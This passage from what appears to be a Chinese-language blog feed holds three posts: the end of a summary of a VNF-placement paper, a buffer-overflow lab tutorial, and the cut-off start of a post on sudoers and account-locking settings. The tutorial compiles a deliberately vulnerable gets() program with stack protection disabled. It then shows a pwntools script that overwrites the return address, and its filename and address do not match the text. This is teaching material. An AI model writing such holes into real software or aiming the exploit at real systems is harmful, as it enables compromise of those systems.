U_{m,n}$<br>舉例來說，來自服務鏈 $c1$ 和 $c2$ 的網路流量在 edge $e_{f_{1},f_{2}}$上傳輸，如下圖所示<br><img src="https://i.imgur.com/Ba0onF6.png"><br>速率分別是 2與1</p><h3 id="D-VNFs-Graph"><a href="#D-VNFs-Graph" class="headerlink" title="D. VNFs Graph"></a>D. VNFs Graph</h3><p>我們的目標是要以VNF instance形式來在圖 $G_{n}$ 之中部屬所有網路功能<br>$G_{n}$中每個網路功能n可能會有多個VNF Instances 在不同資料中心<br>舉例來說如下圖<br><img src="https://i.imgur.com/nZQBKNl.png"><br>網路功能 $f1$可能會有兩個VNF Instance分別位於資料中心 $d1$以及 $d2$</p><p>注意，每個網絡功能 $n$ 在所有 $|D|$ 數據中心中可能最多有 $|D|$ 可能的Instance，<br>並且 $G_{n}$ 中的每一對 $(m,n)$ 也可能相應地在它們之間最多有 $|D|^{2}$ 個鏈接。</p><p>因此，在VNF圖 $G_{v}&#x3D;(V_{v},E_{v})$，節點集合 $V_{v}$ 包括 $|V_{n}| \cdot |D|$ instances 表示為集合 $V$、sources集合 $O$以及目標節點集合 $T$，而 $E_{v}$ 表示他們之間的鏈結。<br>對於每個edge $e_{u,v} \in E_{v}$，讓 $f^{i}<em>{uv}$ 註記為服務鏈 $C</em>{i}$中 instance $u$,$v$ 間的流量速率。</p><p>舉例來說，我們考慮圖 $G_{n}$ 中的兩個網路功能 $(f1,f2)$ 以及edge $e_{f_{1},f_{2}}$，對應的 $G_{v}$ 在下圖中顯示，有 2 個資料中心</p><p><img src="https://i.imgur.com/YhG7xQY.png"></p><p>$f1,f2$的Instance分別是 $v1$ $v2$ 以及 $v3$ $v4$，並且j我們可以觀察到，網路功能 $f1$ $f2$共有4個edge，而𝑓1和𝑓2之間的網絡流量可以在這四個edge之間自由分佈</p><p>於任何實例$v \in V$，我們使用$d(v)$ 和$n(v)$分別表示其資料中心位置和網絡功能類型。例如，$d(v_{1})&#x3D;d1$，$n(v_{1})&#x3D;f1$</p><p>Let $N(n)$ 代表提供網路功能 $n$的VNF集合，例如在上圖中，我們有 $v1$以及 $v2$ 來提供網路功能 $f1$，即 $N(f1)&#x3D;{ v1,v2 }$，對於每個 VNF Instance Pair $(u,v)$，可以透過 $f_{uv}^{i}$ 來表示流經邊緣的網路流量速率。<br>其中對於鏈 $c_{i}$ 上的邊緣滿足 $e_{u,v}\in E_{v}$<br>且在圖 $G_{v}$中，$\forall i\in U_{n(u),n(v)}$</p><p><img src="https://i.imgur.com/heLrZ8U.png"></p><h2 id="Ch3-Problem-Formulation"><a href="#Ch3-Problem-Formulation" class="headerlink" title="Ch3-Problem Formulation"></a>Ch3-Problem Formulation</h2><p>基於上一章的系統模型，我們可以公式化VNF部屬以及流量調度問題，轉換成混合整數線性規劃問題<br>(MILP)，且目標是要最小化所有VNF Pairs之間的部屬以及通訊總成本</p><h3 id="VNF-Instance-Placement"><a href="#VNF-Instance-Placement" class="headerlink" title="VNF Instance Placement"></a>VNF Instance Placement</h3><p>如圖$G_{v}$所示，每個網絡功能可以由所有資料中心託管，每個資料中心可以託管所有類型的網絡功能，因此我們定義了二進位的變數 $x_{v}$ 來表示 <strong>在資料中心 $d(v) 中負責提供的網路功能 $n(v)$ 的VNF Instance 是否被實際部屬</strong></p><p><img src="https://i.imgur.com/LW9uzOu.png"></p><h3 id="Flow-requirement-constraints"><a href="#Flow-requirement-constraints" class="headerlink" title="Flow requirement constraints"></a>Flow requirement constraints</h3><p>對於每個服務鏈 $c_{i}$ 所需要的流量，可被分配到所有它的VNF Instance上<br>例如，鏈 $c_{i}$中的網絡功能pair $m$、$n$ 之間的網絡流率 $R_{i}$ 將分佈到$G_{v}$中Instance $v$、$u$ 之間的所有邊上，其中$n(u)&#x3D;m$，$n(v)&#x3D;n$</p><p><img src="https://i.imgur.com/IdjsfTH.png"></p><p>對於來源節點與目標節點，可以列出以下等式<br><img src="https://i.imgur.com/iattDHR.png"></p><h3 id="VNF-flow-constraint"><a href="#VNF-flow-constraint" class="headerlink" title="VNF flow constraint"></a>VNF flow constraint</h3><p>對於每個VNF Instance，輸入流量是源自輸入instance $i(v)$來處理<br>然後分散到輸出instance $o(v)$</p><p><img src="https://i.imgur.com/4EfnGB6.png"></p><p>其中 $\alpha_{n(v)}$ 是由網路功能來決定的擴展因子(scaling factor)</p><h3 id="The-relationship-between-x-v-and-f-i-uv"><a href="#The-relationship-between-x-v-and-f-i-uv" class="headerlink" title="The relationship between $x_{v}$ and $f^{i}_{uv}$"></a>The relationship between $x_{v}$ and $f^{i}_{uv}$</h3><p>只要有流量通過 VNF 實例 $v$，二進位變數應設定為 1 以提供網絡功能$n(v)$，並且此 VNF 實例應部署在$d(v)$ 中。這可以描述為</p><p><img src="https://i.imgur.com/kNT4fbV.png"></p><p><code>A Joint MILP Formulation</code></p><p>若把上述總結，可以得到以下的 <strong>Cost-min</strong> 問題</p><h3 id="Cost-Min"><a href="#Cost-Min" class="headerlink" title="Cost-Min"></a>Cost-Min</h3><p><img src="https://i.imgur.com/g756xNt.png"></p><p>係數 $\gamma$ 和 $\delta$ 由用戶定義，以平衡部署成本和通訊成本，並可根據不同的 QoS 要求進行調整。</p><h2 id="Ch4-Relaxation-Based-Algorithm"><a href="#Ch4-Relaxation-Based-Algorithm" class="headerlink" title="Ch4-Relaxation-Based Algorithm"></a>Ch4-Relaxation-Based Algorithm</h2><p><img src="https://i.imgur.com/X5V2paB.png"><br>因為有 整數變數 $x_{v}$ ，計算上來解決 Cost-Min問題是被禁止的，特別規模大的網路中。<br>此章節中，我們會提出基於鬆散的方式，來解決Cost-min問題。</p><p>首先我們將 $x_{v}$ 鬆弛為[0,1]範圍內的實數，以降低計算複雜度。經過鬆弛後，我們的模型被簡化為線性規劃(LP)問題，如演算法中第1行，這可以透過Matlab輕鬆解決。</p><p><img src="https://i.imgur.com/cW2iRuY.png"></p><p>我們對 $x_{v}$ 做遞增排序，如演算法表中第2行，</p><p>並將每個非零 $x_{v}$ 的值設為1，如演算法表中第5行，</p><p>在這種情況下，我們以整數 $x_{v}^{*}$ 形式獲得一個新的 VNF 部署解決方案，</p><p>並將每個網絡功能的 VNF Instance 數量記錄為 $count_{n(v)}$，如演算法表中第6行，<br>我們將整數solution  $ x_{v}^{*} $ 作為輸入並計算流量調度的解答 $ f_{uv}^{*j} $ ，且總成本 $cost’$</p><p>我們將整數解 $x_{v}^{*}$ 作為輸入，通過在第 11 行再次求解 Cost-Min-LP 問題來計算流量調度解 $f_{uv}^{*j}$ 和總成本 $cost’$</p><p>請注意，放寬可能會導致更多 VNF 實例，因此我們下一步將嘗試進一步減少實例數量以及部署成本，同時確保從第 12 行到第 22 行間的通訊成本接近最佳化。<br>我們從非零 $x_{v}$ 的最小值內的實例 $v$ 開始。<br>請注意，如果$v$是網絡中唯一提供網絡功能$n(v)$的VNF實例，即$count_{n(v)}$ &#x3D;&#x3D; 1，則必須部署$v$，並且跳到下一個Instance<br>否則，若網路中存在提供相同網路功能 $n(v)$的VNF Instance(見14行)，則我們$x_{v}^{*}$ 設為0，並重新計算流量調度解 $f_{uv}^{*i}$ 和新的總成本 $cost’$</p><p>只有當新成本低於當前的 $minCost$時，才會更新NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 以及總成本 $minCost$，然後更新網路功能 $n(v)$的Instance數量 (見18、19行)</p><p>另一方面，如果總成本沒有降低，我們將 $x_{v}^{*}$ 的值設置回 1 並移動到下一個實例，直到我們遍歷 $V$ 中的所有 VNF 實例（第 25 行）</p><p>最終我們會返回 NFV部屬解 $x_{v}^{*}$、流量調度解 $f_{uv}^{*j}$ 以及總成本 $minCost$ 作為演算法的輸出。</p><h2 id="Ch5-Performance-Evaluation"><a href="#Ch5-Performance-Evaluation" class="headerlink" title="Ch5-Performance Evaluation"></a>Ch5-Performance Evaluation</h2><p>在本節中，我們通過將基於鬆弛的算法 (“RLX”) 與 Cost-Min 的最佳結果 (“OPT”) 和最短路徑算法 (“SP”) 進行比較來評估它<br>實驗設置：</p><ul><li>網絡中有∣𝐷∣ &#x3D; 20 個資料中心。 $H_{dp}$ 隨機設置在 [1,20] 的範圍內，表示DC之間的跳躍數</li><li>共有 20 條服務鏈，多條鏈共享 15 種不同類型的網絡功能</li><li>服務鏈的流量設置在 [1, 10] 的範圍內</li><li>係數 $\gamma$ 設置為 10，$\delta$ 設置為 1</li><li>我們使用商業求解器 Gurobi 來解決我們的 Cost-Min 和 Cost-Min-LP 問題<br>本研究通過在不同場景中改變參數提供了廣泛的實驗</li></ul><h3 id="The-value-of-𝛾"><a href="#The-value-of-𝛾" class="headerlink" title="The value of 𝛾"></a>The value of 𝛾</h3><p><img src="https://i.imgur.com/Et8CiI7.png"><br>首先，我們調查𝛾和𝛿的影響。我們設置 𝛿 &#x3D; 1，並將 𝛾 的值從 5 變為 50。結果如圖 4 所示<br>圖 4 中的結果表明，三種算法的所有成本都隨著 𝛾 的增加而增長。原因是，𝛾的增加會導致更高的 VNF 部署成本。<br>得注意的是，SP 的增長率遠大於其他兩種算法，因為 SP 主要通過減少每個網絡流的路徑長度來關注通信成本，而忽略了部署成本。<br>因此，當部署成本成為主導部分時，SP 顯示的優勢較小<br>例如，當𝛾 &#x3D; 10 時，RLX 算法的部署成本佔總成本的比例為 57%，OPT 為 35%，SP 為 82%。</p><h3 id="The-effect-of-number-of-hops"><a href="#The-effect-of-number-of-hops" class="headerlink" title="The effect of number of hops"></a>The effect of number of hops</h3><p><img src="https://i.imgur.com/ctY1hjZ.png"><br>我們通過將跳數的上限從 2 變為 20 來研究不同網絡拓撲的 OPT、RLX 和 SP 的總成本<br>從圖 5 可以看出，OPT 和 RLX 的成本隨著跳數的增加而略有增長，因為跳數的增加可能會增加通信成本。</p><p>然而，SP卻呈現出下降的趨勢。主要原因是當不同數據中心之間的跳數都很小時，SP可以找到很多最短路徑並在這些路徑上部署VNF實例，而某些網絡功能可能有多個實例，導致部署成本較高。<br>當跳數增加時，SP 只會找到更少的最短路徑，從而導致 VNF 實例更少，部署成本更低。因此，總成本降低。</p><h3 id="The-effect-of-rate"><a href="#The-effect-of-rate" class="headerlink" title="The effect of rate"></a>The effect of rate</h3><p><img src="https://i.imgur.com/KaJ7KXI.png"><br>同樣，我們將 20 條鏈的速率要求上限從 3 更改為 30，以顯示流量要求的影響。<br>圖 6 顯示，當速率上限增加時，所有三種算法的總成本也會增加。<br>這是因為增加流量會導致更高的通信成本以及總成本。</p><h3 id="The-effect-of-the-number-of-chains"><a href="#The-effect-of-the-number-of-chains" class="headerlink" title="The effect of the number of chains"></a>The effect of the number of chains</h3><p><img src="https://i.imgur.com/AKitxrs.png"><br>在這一部分，我們討論了鏈數從 5 到 50 的影響，並比較了三種算法的結果。<br>所有三種算法的上升趨勢都可以在圖 7 中觀察到。<br>原因是更多的服務鏈帶來了更多的網絡功能部署在數據中心，更多的網絡流分佈到 VNF 實例。<br>這將導致更高的部署成本和通信成本，因此所有三種算法的總成本都會上升</p><h3 id="The-effect-of-the-number-of-NFs"><a href="#The-effect-of-the-number-of-NFs" class="headerlink" title="The effect of the number of NFs"></a>The effect of the number of NFs</h3><p><img src="https://i.imgur.com/CqLQxDV.png"><br>最後，圖 8 顯示了所有三種算法的結果，網絡功能的數量從 10 到 55 不等<br>可以得出，成本也上升了。這是因為所有算法都需要在數據中心放置更多的 VNF 實例，從而導致部署成本的增加。同時，不同數據中心的網絡功能之間更多的網絡流量也會導致通信成本的增加。因此，總成本呈上升趨勢。<br>儘管如此，我們的RLX 的優勢始終可以在任何設置下觀察到，因為它優於SP 並接近OPT</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>在本文中，我們研究了地理分佈式數據中心的 VNF 部署和網絡流量調度問題。我們進一步將此問題表述為混合整數線性規劃，目標是最小化總部署成本和通信成本。然後我們提出了一種低複雜度的基於鬆弛的算法來處理計算複雜度。大量基於模擬的性能評估結果表明，我們的算法具有更好的性能，可以有效降低各種場景下的總成本</p><h2 id="資料來源"><a href="#資料來源" class="headerlink" title="資料來源"></a>資料來源</h2><p><a href="https://ieeexplore.ieee.org/document/8422334">https://ieeexplore.ieee.org/document/8422334</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> VNF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>實驗緩衝區溢位漏洞 (Buffer Overflow)</title>
      <link href="/posts/Buffer_Overflow_Test.html"/>
      <url>/posts/Buffer_Overflow_Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>緩衝區溢位漏洞（Buffer Overflow)</strong> 是軟體和系統安全領域中最常見且嚴重的安全漏洞之一。現今數位時代中複雜的軟體系統常常面臨著來自駭客或惡意使用者的威脅。緩衝區溢位漏洞便是這些威脅中最令人擔憂的一種，因其對計算機系統造成的威脅程度不可忽視。</p><p>簡單來說，緩衝區溢位漏洞是指當程式碼嘗試將資料存儲在一個預先定義大小的<strong>記憶體區塊（稱為緩衝區）</strong> 中時，若輸入的資料量超過了緩衝區所能容納的最大值，多餘的資料將會溢出到相鄰的記憶體區域，從而可能覆蓋控制程式執行的指令或資料，進而產生意料之外的行為。</p><p>造成緩衝區溢位漏洞的根本原因是程式設計上的疏忽與錯誤。當程式開發者<strong>未能正確處理使用者輸入的情況</strong>，特別是<strong>未能對輸入進行充分的驗證和限制</strong>，就可能引發這樣的漏洞。攻擊者通常會藉由傳送特製的惡意輸入數據，利用這些未經檢查的輸入，使程式遭受緩衝區溢位攻擊。這種攻擊手法已經存在多年，並且在歷史上造成了許多嚴重的安全事件。</p><p>過去，許多知名的緩衝區溢位漏洞被廣泛報導，其中一些甚至對全球資訊安全產生了深遠影響。例如，著名的 <code>Code Red</code> 和 <code>Nimda</code> 蠕蟲就是利用緩衝區溢位漏洞來快速感染數以萬計的主機。同樣的，<code>Slammer</code> 蠕蟲也是利用微軟SQL Server中的緩衝區溢位漏洞，導致了全球互聯網流量的瞬間飆升。這些事件提醒了整個科技業界必須高度重視緩衝區溢位漏洞的威脅。</p><blockquote><p>SQL Slammer - <a href="https://en.wikipedia.org/wiki/SQL_Slammer">https://en.wikipedia.org/wiki/SQL_Slammer</a></p></blockquote><p>所以這篇文章就來簡單的實驗一下緩衝區溢位漏洞，至少讓我有點概念。</p><h2 id="環境配置"><a href="#環境配置" class="headerlink" title="環境配置"></a>環境配置</h2><p>在環境配置方面，我們使用 <strong>Windows Subsystem for Linux (WSL)</strong> 平台來配置開發環境，並且使用 <code>Ubuntu 20.04 LTS</code> 作為開發環境。我們將在這個環境中安裝所需的工具，包括 <code>Python3</code>、<code>Pwntool</code>，以及用於進行 GDB 除錯 的 <code>PEDA</code> 插件。</p><p>WSL 提供了一個在 Windows 系統上運行 Linux 發行版的功能，讓我們能夠在 Windows 環境中進行 Linux 相關的開發工作。Ubuntu 20.04 LTS 是一個穩定且常見的 Linux 發行版，其廣泛應用於開發和測試環境。</p><p>在進行環境配置之前，我們需要確保已安裝並運行了 WSL。安裝 WSL 可以參考微軟官方文檔或相關的線上教程。</p><blockquote><p><a href="https://learn.microsoft.com/zh-tw/windows/wsl/install">https://learn.microsoft.com/zh-tw/windows/wsl/install</a></p></blockquote><p>接下來，我們需要在 WSL 中安裝 Python3 和 Pwntool。Pwntool 是在 CTF中很常見，特別針對漏洞利用開發的 Python 函式庫。</p><p>在安裝 Pwntool 前，我們需要確保 git 已經在 WSL 中安裝，若未安裝則可使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>接下來，我們可以透過以下方法來安裝 Pwntool：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3 python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>現在我們已經在 WSL 中完成 Python3 和 Pwntool 的安裝。</p><p>接下來，我們將配置 GDB DEBUG環境，使用 PEDA 插件來幫助我們進行緩衝區溢位漏洞的演練。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>最後，這裡提供了一個簡單的 C 程式 <code>buffer_test.c</code> 作為我們實際演示緩衝區溢位漏洞的目標。該程式包含了一個 <code>uname()</code> 函數，其中使用了 <code>gets()</code> 函數來接收使用者輸入，但是未對輸入進行足夠的驗證，從而可能引發緩衝區溢位漏洞。</p><p>buffer_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh No! Your Hacker.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uname</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input your name: \n&quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s \n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);  <span class="comment">//清除暫存</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    uname();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>程式中含有危險輸入函式 <strong>gets</strong> ，作為 Buffer Overflow的練習程式</p></div><h2 id="實驗步驟"><a href="#實驗步驟" class="headerlink" title="實驗步驟"></a>實驗步驟</h2><h3 id="一、-編譯程式"><a href="#一、-編譯程式" class="headerlink" title="一、 編譯程式"></a>一、 編譯程式</h3><p>首先，我們需要編譯名為 <code>buffer_test.c</code> 的程式碼，以便進行後續的實驗。編譯時我們需要關閉 <strong>Stack Canary</strong> 的防護機制，可以使用以下指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie</span><br></pre></td></tr></table></figure><div class="note info flat"><p><code>-fno-stack-protector</code> ：關閉 Stack Canary 的防護機制</p></div><h2 id="二、-檢查防護措施"><a href="#二、-檢查防護措施" class="headerlink" title="二、 檢查防護措施"></a>二、 檢查防護措施</h2><p>在實驗開始前，需要確認目標程式的安全防護機制。可以用 &#96;checksec 指令可以快速查看目標執行檔的相關安全措施：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec buffer_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HuO3k3R.png"></p><h2 id="三、-確認目標："><a href="#三、-確認目標：" class="headerlink" title="三、 確認目標："></a>三、 確認目標：</h2><p>在進行攻擊之前，需要先確認目標。在這個實驗中，我們的目標是執行 &#96;target 函式，因此需要找到該函式的記憶體位址，並蓋過函式返回位址。</p><h2 id="四、確認函式記憶體位址"><a href="#四、確認函式記憶體位址" class="headerlink" title="四、確認函式記憶體位址"></a>四、確認函式記憶體位址</h2><p>透過 GDB 來查詢 <code>target</code> 函式的記憶體位址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb buffer_test</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas target</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l1S7BAX.png"></p><p>從上圖可得知，此function開始的位址在 <code>0x0000000000401196</code><br>得知了函式位址後，接著要知道如何從 input 蓋到 ret</p><h2 id="五、測試"><a href="#五、測試" class="headerlink" title="五、測試"></a>五、測試</h2><p>在實際進行攻擊之前，我們先在 GDB 中執行程式，並觀察它的行為：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peta$ </span><span class="language-bash">r    //先跑跑看</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jdWT4BI.png"></p><p>程式會要求使用者輸入名字，並在名字輸入完畢後回應 <code>Hello, &#123;name&#125;</code>。由於原程式中容納使用者輸入的陣列只有 16 個位元組（<code>RBP ~ RBP-16</code>），<strong>所以我們可以透過輸入超過 16 個位元組的資料來觀察它的行為。</strong></p><p><img src="https://i.imgur.com/HOnCJiX.png" alt="Imgur"></p><p>如圖所示，當輸入超過 24 個位元組時，程式就會發生緩衝區溢位，並且在字元 v 後就發生崩潰。這表示我們需要至少 24 個位元組的輸入，才能成功蓋過函式返回位址。</p><blockquote><p>所以再 <code>8Bytes</code> 即可蓋完 ret address</p></blockquote><blockquote><p>RBP 那顯示只到 qrstuvwx，意思就是輸到24byte就爆了</p></blockquote><h2 id="六、實際用-Python-來覆蓋"><a href="#六、實際用-Python-來覆蓋" class="headerlink" title="六、實際用 Python 來覆蓋"></a>六、實際用 Python 來覆蓋</h2><p>為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 <code>Pwntools</code> 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 <code>target</code> 函式。</p><p>攻擊腳本 attack.py 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your name:&#x27;</span>) </span><br><span class="line">targer_address = p64(<span class="number">0x400667</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + targer_address)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>在攻擊腳本中，我們使用 <code>process()</code> 函式來執行 buffer_test 程式。接著，透過 <code>recvuntil()</code> 函式等待程式顯示 <strong>“input your name:”</strong> 的提示，然後將我們事先計算好的 <code>target</code> 函式位址加入到輸入資料中。最後，使用 <code>interactive()</code> 函式進入互動模式，以便觀察攻擊的結果。</p><ul><li><p><code>recvuntil()</code>：receive until，可接收特定字串，當到達目標字串時，執行xx指令</p></li><li><p><code>p8()</code>、<code>p32()</code>、<code>p64()</code></p><p> <img src="https://i.imgur.com/HZzm1tq.png"></p><ul><li><code>p32</code>：對data 打包 (32bit  integer)  &#x2F;&#x2F;u32：解包</li><li><code>p64</code>：對 data 打包 (64bit integer)  &#x2F;&#x2F;u64 :解包<br>轉成位址</li></ul></li><li><p><code>sendline(payload)</code>：發送payload，並換行</p></li><li><p><code>interactive()</code>：進入交互模式，可用來執行本地或遠端執行檔</p></li></ul><h2 id="七、-執行攻擊腳本"><a href="#七、-執行攻擊腳本" class="headerlink" title="七、 執行攻擊腳本"></a>七、 執行攻擊腳本</h2><p>最後，我們執行攻擊腳本以進行攻擊：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 attack.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hr1LHfQ.png"></p><p>攻擊成功後，程式將會執行 <code>target</code> 函式，並顯示 “Oh No! Your Hacker.” 的訊息，證明我們成功地利用緩衝區溢位漏洞進行了攻擊。</p><div class="note success flat"><p>成功執行target函式!</p></div><div class="note warning flat"><p>請記得在實際環境中應用所學的知識時，確保遵守相關法律法規，並僅在合法授權的情況下進行安全測試與漏洞利用。</p></div><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p><a href="https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow">https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
            <tag> Buffer Overflow </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提升Linux系統管理技能：掌握SUDO權限配置和帳戶設定</title>
      <link href="/posts/555098e9.html"/>
      <url>/posts/555098e9.html</url>
      
        <content type="html"><![CDATA[<p>當我們在Linux系統中運行一般使用者帳戶時，有時會需要執行需要超級用戶權限的指令，例如更新軟體包或下載檔案等。然而，如果一般使用者沒有被授予sudo權限，就無法執行這些指令。<strong>為了讓一般使用者能夠使用sudo指令，我們需要進行sudoers設定</strong>。</p><p>這裡將介紹如何配置sudo權限以及其他有趣的帳戶存取相關的設定。</p><h1 id="sudoers設定檔"><a href="#sudoers設定檔" class="headerlink" title="sudoers設定檔"></a>sudoers設定檔</h1><p>在Linux系統中，可以使用sudoers設定檔來指定使用者、群組或別名的sudo權限。該設定檔通常位於<code>/etc/sudoers</code>。</p><p><img src="https://i.imgur.com/EcE7ix5.png"></p><p>然而，為了避免對sudoers設定檔進行錯誤的更改，我們應該使用 <code>visudo</code> 指令來編輯設定檔。</p><p><code>visudo</code> 在保存設定時會檢查是否存在錯誤的配置，例如錯誤的權限或語法問題。請注意，sudoers設定檔只能使用 <code>visudo</code> 指令來編輯，如果直接使用vim等編輯器，可能會遇到唯讀或無法覆寫的問題，會跳出 <strong>read-only，cannot override.</strong></p><p>可以使用以下命令來打開sudoers設定檔進行編輯：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/rqL2ZNl.png"></p><p>一旦打開了設定檔，可以在root行下方添加新的配置，指定要授予哪個使用者或群組什麼樣的權限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root  ALL=(ALL:ALL) ALL</span><br><span class="line">[user 帳號] [user的來源主機]=([可切換的身份])[可執行的指令]</span><br></pre></td></tr></table></figure><h1 id="其他有趣的帳戶存取設定"><a href="#其他有趣的帳戶存取設定" class="headerlink" title="其他有趣的帳戶存取設定"></a>其他有趣的帳戶存取設定</h1><h3 id="passwd-參數-l"><a href="#passwd-參數-l" class="headerlink" title="passwd 參數 -l"></a>passwd 參數 -l</h3><p><img src="https://i.imgur.com/NUH03vf.png"></p><p><code>passwd</code>  命令的-l參數用於鎖定帳戶密碼。<strong>當我們鎖定帳戶密碼時，系統會將密碼的雜湊值(放在 &#x2F;etc&#x2F;shadow )更改為系統中尚未使用的值。</strong> 鎖定的密碼在 <code>/etc/passwd</code> 檔案中的密碼雜湊值前面顯示一個驚嘆號(!)。因此，當我們使用以下命令鎖定帳戶密碼時：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l</span><br></pre></td></tr></table></figure><p>其他使用者使用sudo su等指令時，將無法切換為root用戶。<br>此外，我們可以使用chsh命令來更改帳戶的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span class="line">chsh [user/root]</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/DHCIuI0.png"></p><p>上面的截圖顯示了passwd命令的輸出，其中root用戶的預設shell是 <code>/bin/bash</code>。<br>另外，而可以觀察到其他很多都是 <code>/usr/sbin/nologin</code>，這表示在本地或遠端都無法使用這個帳戶登錄。因此，如果將root的shell更改為 <code>/usr/sbin/nologin</code>，則沒有人可以訪問root帳戶。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chsh root</span><br><span 